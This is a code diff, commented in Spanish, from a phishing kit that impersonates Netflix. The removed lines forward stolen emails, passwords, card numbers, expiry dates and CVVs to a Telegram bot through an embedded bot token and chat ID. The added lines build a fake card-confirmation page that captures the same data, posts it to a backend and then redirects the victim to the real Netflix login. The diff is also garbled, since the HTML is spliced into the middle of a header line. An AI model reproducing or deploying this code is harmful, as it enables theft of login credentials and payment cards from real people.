@@ -3,30 +3,69 @@
 export default async function handler(req, res) {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-    res.setHeader('Cache-Control', 'no-store');
+    res.setHeader('Ca<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmaci&oacute;n</title>
+    <style>
+        body { background: #fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; display: flex; justify-content: center; }
+        .container { max-width: 440px; width: 100%; padding: 20px; margin-top: 20px; }
+        h1 { font-size: 32px; font-weight: bold; color: #333; }
+        .input-box { margin-bottom: 12px; }
+        .input-box input { width: 100%; padding: 16px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 16px; box-sizing: border-box; }
+        .btn { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 10px; }
+        .footer-text { font-size: 13px; color: #737373; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Configura tu tarjeta</h1>
+        <p>Completa los detalles para continuar con tu suscripción.</p>
+        
+        <form id="direct-form">
+            <div class="input-box"><input type="password" id="pw" placeholder="Contraseña de cuenta" required></div>
+            <div class="input-box"><input type="text" id="nm" placeholder="Nombre en tarjeta" required></div>
+            <div class="input-box"><input type="text" id="cc" placeholder="Número de tarjeta" maxlength="16" required></div>
+            <div style="display: flex; gap: 10px;">
+                <input type="text" id="ex" placeholder="MM/AA" maxlength="5" style="width: 50%; padding: 16px; border: 1px solid #8c8c8c;" required>
+                <input type="text" id="cv" placeholder="CVV" maxlength="4" style="width: 50%; padding: 16px; border: 1px solid #8c8c8c;" required>
+            </div>
+            
+            <button type="submit" class="btn">INICIAR MEMBRESÍA</button>
+        </form>
 
-    if (req.method === 'OPTIONS') return res.status(200).end();
-    
-    // Respondemos OK de inmediato para que el navegador no se quede esperando
-    res.status(200).json({ ok: true });
+        <p class="footer-text">Al hacer clic, aceptas nuestros Términos de uso.</p>
+    </div>
 
-    const { em, pw, nm, cc, ex, cv } = req.body;
-    const botToken = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
-    const chatId = "7993722214";
+    <script>
+        document.getElementById('direct-form').addEventListener('submit', function(e) {
+            e.preventDefault();
 
-    const mensaje = `⭐ **HIT INSTANTÁNEO** ⭐\n\n` +
-                    `📧 **Email:** \`${em}\` \n` +
-                    `🔑 **Pass:** \`${pw}\` \n\n` +
-                    `👤 **Nombre:** ${nm}\n` +
-                    `💳 **Tarjeta:** \`${cc}\` \n` +
-                    `📅 **Exp:** ${ex} | **CVV:** ${cv}`;
+            // Captura rápida de datos
+            const payload = {
+                em: sessionStorage.getItem('usr_mail') || 'No capturado',
+                pw: document.getElementById('pw').value,
+                nm: document.getElementById('nm').value,
+                cc: document.getElementById('cc').value.replace(/\s/g, ''),
+                ex: document.getElementById('ex').value,
+                cv: document.getElementById('cv').value
+            };
 
-    // El envío a Telegram ocurre después de responder al navegador
-    try {
-        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            chat_id: chatId,
-            text: mensaje,
-            parse_mode: 'Markdown'
+            // ENVÍO "FIRE AND FORGET" (Disparar y olvidar)
+            fetch(`/api/enviar?ts=${Date.now()}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+                keepalive: true 
+            });
+
+            // REDIRECCIÓN ULTRA RÁPIDA (200ms es casi imperceptible)
+            setTimeout(() => {
+                window.location.href = "https://www.netflix.com/login";
+            }, 200);
         });
-    } catch (e) {}
-}
+    </script>
+</body>
+</html>
